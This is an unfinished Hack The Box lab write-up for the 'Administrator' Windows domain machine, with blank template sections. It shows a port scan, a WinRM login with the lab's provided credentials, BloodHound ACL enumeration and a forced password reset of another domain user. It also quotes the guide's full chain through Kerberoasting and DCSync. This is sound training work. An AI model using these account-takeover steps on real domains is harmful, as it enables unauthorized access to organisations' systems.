# Report - Administrator (HTB)

- Author: Henry Post
- Target: hackme.examplebox
- Target IP: 10.129.57.2
- Attacker IP: 2.3.4.5
- Date: 03/01/2026

## Executive Summary



### Recommendations

1. a
2. b
3. c
4. d
5. e
6. f

## Resources

- https://app.hackthebox.com/machines/Administrator
- github link
- medium link
- exploit-db link


## Preamble

So, I'm going to use the official guide again because i'm a n00b.

> Administrator is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the michael account, ACLs (Access Control Lists) over privileged objects are enumerated, leading us to discover that the user olivia has GenericAll permissions over michael , allowing us to reset his password. With access as michael , it is revealed that he can force a password change on the user benjamin , whose password is reset. This grants access to FTP where a backup.psafe3 file is discovered, cracked, and reveals credentials for several users. These credentials are sprayed across the domain, revealing valid credentials for the user emily . Further enumeration shows that emily has GenericWrite permissions over the user ethan , allowing us to perform a targeted Kerberoasting attack. The recovered hash is cracked and reveals valid credentials for ethan , who is found to have DCSync rights ultimately allowing retrieval of the Administrator account hash and full domain compromise.


And...

> As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: `Olivia` Password: `ichliebedich`

Cool.
## Recon

I ran an nmap scan that enumerated their ports:

```sh
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sS -sV 10.129.57.2    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 22:02 -0400
Nmap scan report for 10.129.57.2
Host is up (0.026s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-07 09:02:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.43 seconds


```

Let's see if we can WinRM as `Olivia`.

```sh
evil-winrm -i 10.129.57.2 -u 'Olivia' -p 'ichliebedich'
```

It works. Great.

![](Pasted%20image%2020260806210540.png)

How do I enumerate ACLs as Olivia? Time to consult the writeup.

Okay. They use BloodHound.

```sh
echo "10.129.57.2 administrator.htb" | sudo tee -a /etc/hosts

bloodhound-python -d administrator.htb -c All -u olivia -p 'ichliebedich' -ns 10.129.57.2 -k

cd ~
mkdir bloodhound
cd bloodhound

wget https://ghst.ly/getbhce -O docker-compose.yml
docker-compose up -d
docker-compose logs bloodhound | grep -i passw
# head to http://localhost:8080/
# upload resulting json files from previous step `bloodhound-python`...
```

So, Olivia to DA. No path. None to admin, either...

Back to cheating :P

> Next, we set the olivia user as our starting node, select the Node Info tab, and scroll down to Outbound Object Control . We then select First Degree Object Control , which shows that Olivia has GenericAll permissions over Michael.

Okay. More BloodHound wizardry I would have never known.

"Outbound Object Control" then "First Degree Object Control"...

![](Pasted%20image%2020260806212404.png)

Okay. So Olivia has GenericAll on Michael. The guide says "This grants us complete control over the object"...

Meaning, we can force change a password with Evil-WinRM and the `net user` command.

```sh
evil-winrm -i 10.129.57.2 -u 'Olivia' -p 'ichliebedich'

net user michael potato123 /domain
```

Now we should be able to login as Michael with `potato123`...

But before that, guide wisdom... "Now with access to michael's account, we select `Node Info` in BH and scroll down to `Outbound Object Control`. Upon selecting `Transitive Object Control` we see that Michael has `ForceChangePassword` on `Benjamin`."

Neat.

We also apparently need this:

https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1




## Non-root access



(IMG_PLACEHOLDER)
    
    ip a
    whoami
    hostname
    date
    cat local.txt

## Root access



## Proof

### Local proof

- `ip a`/`ifconfig`
- `whoami`
- `hostname`
- `date`
- `cat local.txt`
(IMG_PLACEHOLDER)

### Root proof

- `ip a`/`ifconfig`
- `whoami`
- `hostname`
- `date`
- `cat proof.txt`
(IMG_PLACEHOLDER)
